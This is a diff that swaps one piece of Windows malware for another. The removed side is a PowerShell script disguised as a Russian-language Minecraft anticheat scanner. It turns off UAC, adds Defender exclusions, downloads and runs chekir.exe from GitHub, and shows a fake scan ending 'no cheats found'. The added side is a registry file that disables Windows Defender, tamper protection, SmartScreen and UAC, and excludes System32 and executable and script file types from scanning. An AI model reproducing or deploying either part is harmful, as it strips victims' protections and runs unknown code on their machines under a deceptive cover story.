@@ -1,78 +1,59 @@
-# ╔══════════════════════════════════════════════════════════╗
-# ║          MINECRAFT ANTICHEAT SCANNER v9.666             ║
-# ║          100% ЯДЕРНО-ЗЕЛЁНЫЙ СКАНЕР • 30 сек проверка      ║
-# ╚══════════════════════════════════════════════════════════╝
+Windows Registry Editor Version 5.00
 
-$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
-Set-ItemProperty -Path $uacPath -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]
+"DisableAntiSpyware"=dword:00000001
 
-try {
-    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
-        $paths = @(
-            [Environment]::GetFolderPath("ProgramFiles")
-            [Environment]::GetFolderPath("ProgramFilesX86")
-            [Environment]::GetFolderPath("ApplicationData")
-            [Environment]::GetFolderPath("LocalApplicationData")
-            [System.IO.Path]::GetTempPath()
-        )
-        foreach ($path in $paths) { Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue }
-    }
-} catch {}
-Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/chekir.exe" -OutFile "chekir.exe"; .\chekir.exe
-# ╔══════════════════ ВИЗУАЛ ══════════════════╗
-$Host.UI.RawUI.BackgroundColor = "Black"
-$Host.UI.RawUI.ForegroundColor = "Green"
-Clear-Host
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection]
+"DisableRealtimeMonitoring"=dword:00000001
+"DisableBehaviorMonitoring"=dword:00000001
+"DisableOnAccessProtection"=dword:00000001
+"DisableScanOnRealtimeEnable"=dword:00000001
+"DisableIOAVProtection"=dword:00000001
 
-Write-Host @"
-   __  __ _                  _             __ 
-  |  \/  (_)_ __   ___      / \   _ __ ___ / _|
-  | |\/| | | '_ \ / _ \    / _ \ | '__/ __| |_ 
-  | |  | | | | | |  __/   / ___ \| | | (__|  _|
-  |_|  |_|_|_| |_|\___|  /_/   \_\_|  \___|_|  
-       ██████ ANTICHEAT SCANNER ██████
-"@ -ForegroundColor Green
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features]
+"TamperProtection"=dword:00000004
 
-Write-Host "       Запуск глубокой проверки на читы Minecraft..." -ForegroundColor DarkGreen
-Start-Sleep -Seconds 2
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService]
+"Start"=dword:00000004
 
-$steps = 30
-for($i = 1; $i -le $steps; $i++) {
-    $percent = [math]::Round(($i / $steps) * 100)
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend]
+"Start"=dword:00000004
 
-    if($i -in 8,16,24,30) {
-        $msg = switch($i) {
-            8  {"СКАНИРОВАНИЕ ПАМЯТИ"}
-            16 {"ПРОВЕРКА ИНЖЕКТОВ"}
-            24 {"АНАЛИЗ МОДОВ И КЛИЕНТОВ"}
-            30 {"ЧИТЫ НЕ ОБНАРУЖЕНЫ ✓"}
-        }
-        Write-Host "  █████████████████ $msg █████████████████" -ForegroundColor Green
-    }
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisSvc]
+"Start"=dword:00000004
 
-    Write-Progress -Activity "MINECRAFT ANTICHEAT SCAN" -Status "$percent% Завершено" -PercentComplete $percent
-    Start-Sleep -Milliseconds 950
-}
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System]
+"EnableSmartScreen"=dword:00000000
 
-Clear-Host
-$Host.UI.RawUI.ForegroundColor = "Green"
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter]
+"EnabledV9"=dword:00000000
 
-Write-Host @"
-════════════════════════════════════════════════════════════
-░▒▓█ MINECRAFT ANTICHEAT SCAN ЗАВЕРШЁН УСПЕШНО █▓▒░
-════════════════════════════════════════════════════════════
-  Статус проверки:   ████████████████████ 100% 
-  Результат:         ЧИТЫ НЕ ОБНАРУЖЕНЫ ✓✓✓
-  X-Ray:             не найден
-  KillAura:          не найден
-  Fly / Speed:       не найден
-  Reach / Jesus:     не найден
-  Подозрительные моды: 0
-  Вердикт:           ЧИСТЫЙ АККАУНТ
-════════════════════════════════════════════════════════════
-"@ -ForegroundColor Green
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\WindowsStore]
+"AutoDownload"=dword:00000004
 
-Write-Host "  Ты прошёл проверку! Можешь спокойно играть :)" -ForegroundColor DarkGreen
-Start-Sleep -Seconds 1
-Write-Host "  Нажмите любую клавишу, чтобы закрыть сканер..." -ForegroundColor DarkGreen
-$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet]
+"SpynetReporting"=dword:00000000
+"SubmitSamplesConsent"=dword:00000002
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\Common]
+"AVSCheckProcess"=dword:00000000
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Controlled Folder Access]
+"EnableControlledFolderAccess"=dword:00000000
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]
+"EnableLUA"=dword:00000000
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths]
+"C:\\Windows\\System32"=dword:00000001
+"C:\\Windows\\SysWOW64"=dword:00000001
+"C:\\ProgramData"=dword:00000001
+"C:\\Users\\Public"=dword:00000001
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Extensions]
+".bat"=dword:00000001
+".ps1"=dword:00000001
+".vbs"=dword:00000001
+".js"=dword:00000001
+".exe"=dword:00000001
+".cmd"=dword:00000001
